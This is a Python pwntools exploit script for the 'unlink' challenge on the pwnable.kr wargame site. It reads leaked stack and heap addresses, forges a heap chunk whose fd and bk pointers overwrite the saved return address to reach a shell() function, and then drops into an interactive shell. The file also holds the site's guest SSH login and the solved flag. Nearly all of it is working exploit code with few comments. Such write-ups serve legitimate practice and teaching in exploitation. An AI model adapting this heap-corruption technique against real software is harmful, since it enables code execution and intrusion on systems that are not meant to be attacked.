#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("unlink")
# libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.log_level = 'DEBUG'

print(f"Terminal: {context.terminal}")

gs = '''
b unlink
b *0x80485ff
continue
'''
def start():
    if args.SSH:
        s=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)
        io=s.process('./unlink')
    else:
        io = process(elf.path)
        if args.GDB:
            gdb.attach(io, gdbscript=gs)
    return io

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"here is stack address leak: ")
stack = int(io.recvline(), 16)

# This binary leaks the heap start address.
io.recvuntil(b"here is heap address leak: ")
heap = int(io.recvline(), 16)

io.recvuntil(b"now that you have leaks, get shell!")
io.timeout = 0.1

# =============================================================================

print(f"Shell() address: {hex(elf.sym.shell)}")
print(f"Stack() address: {hex(stack)}")
print(f"Heap() address: {hex(heap)}")

# addreses to switch: (ret address) <-> (address to heap contains shell() ptr ) 
# this works only on the end of main it dereferences the return address for some reason
# addreses to switch: (stack + XXX) <-> (heap +8)

fd = heap +8+4
bk = stack+20-0x30+44
print(f"FD = {hex(fd)}, BK = {hex(bk)}")

shell_address = elf.sym.shell
fake_size = 0x21
# time.sleep(1)

payload = p32(shell_address) + cyclic(0x10) + p32(fake_size) + p32(fd) + p32(bk)+ b'\n'
io.send(payload)
print(f"payload = {payload}")
# time.sleep(3)
io.send(b"ls\n")
# time.sleep(2    )

# =============================================================================

io.interactive()
# flag = conditional_write_what_where_from_unl1nk_explo1t